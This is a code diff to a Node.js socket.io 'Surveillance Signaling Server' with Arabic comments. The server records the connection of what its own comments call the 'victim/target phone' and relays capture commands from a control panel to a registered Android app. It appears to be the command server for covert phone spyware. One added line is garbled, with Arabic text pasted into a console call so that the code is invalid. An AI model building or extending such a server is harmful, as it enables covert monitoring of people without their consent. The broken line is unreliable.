@@ -5,7 +5,6 @@ const { Server } = require('socket.io');
 const app = express();
 const server = http.createServer(app);
 
-// إعداد Socket.io للسماح بالاتصال
 const io = new Server(server, {
   cors: { origin: '*' }
 });
@@ -14,36 +13,35 @@ app.get('/', (req, res) => {
   res.send('Surveillance Signaling Server is Running Live!');
 });
 
-// مسار اختبار سريع عبر المتصفح لتجاوز لوحة التحكم
-app.get('/trigger-test', (req, res) => {
-  const sockets = Array.from(io.sockets.sockets.values());
-  const targetSocket = sockets.find(s => s.data && s.data.deviceName);
-  
-  if (targetSocket) {
-    targetSocket.emit('request-surveillance');
-    res.send(`تم إرسال أمر الالتقاط بنجاح إلى الجهاز: ${targetSocket.data.deviceName}`);
-  } else {
-    res.status(400).send("لا يوجد أي هاتف متصل بالسيرفر حالياً! تأكد من فتح التطبيق على الهاتف.");
-  }
-});
+// متغير لحفظ معرف اتصال هاتف الضحية/الهدف أينما سجل
+let targetSocketId = null;
 
 io.on('connection', (socket) => {
   console.log('جهاز متصل جديد:', socket.id);
 
-  // استقبال حدث تسجيل الجهاز القادم من تطبيق الأندرويد
+  // استقبال حدث تسجيل الجهاز من تطبيق الأندرويد
   socket.on('register-device', (deviceName) => {
-    socket.data.deviceName = deviceName;
+    targetSocketId = socket.id; // حفظ معرف الاتصال مباشرة
     console.log(`تم تسجيل الجهاز بنجاح: ${deviceName} بمعرف الاتصال: ${socket.id}`);
   });
 
-  // إرسال أمر المراقبة إلى التطبيق المستهدف عند الطلب
-  socket.on('trigger-surveillance', (targetSocketId) => {
-    io.to(targetSocketId).emit('request-surveillance');
-    console.log(`تم إرسال أمر المراقبة للجهاز: ${targetSocketId}`);
+  // استقبال أمر المراقبة من لوحة التحكم (يدعم الكائن أو النص المباشر)
+  socket.on('trigger-surveillance', (data) => {
+    console.تم استلام أمر التقاط من لوحة التحكم, console.log('DATA:', data);
+    
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('request-surveillance');
+      console.log(`تم إرسال أمر المراقبة للجهاز بمعرف: ${targetSocketId}`);
+    } else {
+      console.log('خطأ: لا يوجد هاتف مسجل حالياً لاستلام الأمر!');
+    }
   });
 
   socket.on('disconnect', () => {
     console.log('جهاز قطع الاتصال:', socket.id);
+    if (socket.id === targetSocketId) {
+      targetSocketId = null;
+    }
   });
 });
 
